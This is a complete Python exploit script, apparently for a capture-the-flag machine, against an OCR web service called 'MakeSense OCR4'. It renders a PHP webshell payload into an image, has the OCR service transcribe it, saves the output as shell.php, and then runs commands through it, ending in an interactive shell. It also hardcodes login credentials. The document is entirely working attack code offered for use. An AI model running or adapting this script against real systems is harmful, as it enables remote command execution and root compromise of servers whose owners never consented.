#!/usr/bin/env python3
"""
MakeSense OCR4 Exploit - Root RCE via OCR Webshell
"""

import requests
import base64
import sys
import os
from PIL import Image, ImageDraw, ImageFont
from io import BytesIO

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

class OCR4Exploit:
    def __init__(self, target="http://127.0.0.1:8001", username="walter", password="JbhHDAEgXvri3!"):
        self.target = target.rstrip('/')
        self.auth = (username, password)
        self.session = requests.Session()
        self.session.auth = self.auth
        
    def create_php_image(self, php_code='<?php system($_GET["c"]); ?>'):
        """Create an image with PHP code as text"""
        print("[*] Creating PHP webshell image...")
        
        img = Image.new('RGB', (700, 60), 'white')
        d = ImageDraw.Draw(img)
        
        try:
            font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf', 18)
        except:
            font = ImageFont.load_default()
        
        d.text((5, 20), php_code, fill='black', font=font)
        
        # Save to buffer
        buffer = BytesIO()
        img.save(buffer, format='PNG')
        buffer.seek(0)
        
        return base64.b64encode(buffer.read()).decode()
    
    def send_to_ocr(self, b64_image):
        """Send image to OCR and get OCR_ID"""
        print("[*] Sending image to OCR service...")
        
        data_url = f"data:image/png;base64,{b64_image}"
        
        response = self.session.post(
            f"{self.target}/",
            data={"canvas_image": data_url}
        )
        
        if response.status_code == 200:
            # Extract OCR_ID from response
            import re
            match = re.search(r'ocr_id"\s+value="([^"]+)"', response.text)
            if match:
                ocr_id = match.group(1)
                print(f"[+] OCR_ID: {ocr_id}")
                return ocr_id
            else:
                print("[-] Could not find OCR_ID in response")
                print(f"[*] Response preview: {response.text[:500]}")
                return None
        else:
            print(f"[-] Request failed: {response.status_code}")
            return None
    
    def save_as_php(self, ocr_id, filename="shell.php"):
        """Save OCR output as PHP file"""
        print(f"[*] Saving as {filename}...")
        
        response = self.session.post(
            f"{self.target}/",
            data={
                "ocr_id": ocr_id,
                "filename": filename,
                "save_output": "1"
            }
        )
        
        if response.status_code == 200:
            print(f"[+] File saved: {self.target}/saved/{filename}")
            return True
        else:
            print(f"[-] Save failed: {response.status_code}")
            return False
    
    def execute_command(self, cmd, filename="shell.php"):
        """Execute command via webshell"""
        print(f"[*] Executing: {cmd}")
        
        response = self.session.get(
            f"{self.target}/saved/{filename}",
            params={"c": cmd}
        )
        
        if response.status_code == 200:
            return response.text
        else:
            return f"Error: {response.status_code}"
    
    def get_shell(self, filename="shell.php"):
        """Interactive pseudo-shell"""
        print("\n" + "="*60)
        print(f"[+] Webshell: {self.target}/saved/{filename}?c=CMD")
        print("[+] Type commands or 'exit' to quit")
        print("="*60 + "\n")
        
        while True:
            try:
                cmd = input("shell> ").strip()
                if cmd.lower() == 'exit':
                    break
                if not cmd:
                    continue
                
                output = self.execute_command(cmd, filename)
                print(output)
                
            except KeyboardInterrupt:
                print("\n[!] Exiting...")
                break
    
    def exploit(self, filename="shell.php", php_code=None):
        """Main exploit function"""
        print("="*60)
        print("MakeSense OCR4 - Root RCE Exploit")
        print("="*60)
        
        # Step 1: Create PHP image
        if not php_code:
            php_code = '<?php system($_GET["c"]); ?>'
        
        b64_image = self.create_php_image(php_code)
        
        # Step 2: Send to OCR
        ocr_id = self.send_to_ocr(b64_image)
        if not ocr_id:
            print("[-] Exploit failed at OCR step")
            return False
        
        # Step 3: Save as PHP
        if not self.save_as_php(ocr_id, filename):
            print("[-] Exploit failed at save step")
            return False
        
        # Step 4: Verify
        result = self.execute_command("id", filename)
        print(f"[+] Command output: {result.strip()}")
        
        if "uid=0" in result:
            print("\n[+] SUCCESS! Root access achieved!")
        else:
            print(f"\n[*] Web shell active (user: {result.strip()})")
        
        return True


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 exploit.py [command]")
        print("Examples:")
        print("  python3 exploit.py                    # Interactive shell")
        print("  python3 exploit.py 'id'               # Single command")
        print("  python3 exploit.py 'cat /root/root.txt' # Get root flag")
        sys.exit(1)
    
    exploit = OCR4Exploit(
        target="http://127.0.0.1:8001",
        username="walter",
        password="JbhHDAEgXvri3!"
    )
    
    if exploit.exploit():
        cmd = sys.argv[1] if len(sys.argv) > 1 else None
        if cmd:
            print(exploit.execute_command(cmd))
        else:
            exploit.get_shell()


if __name__ == "__main__":
    main()
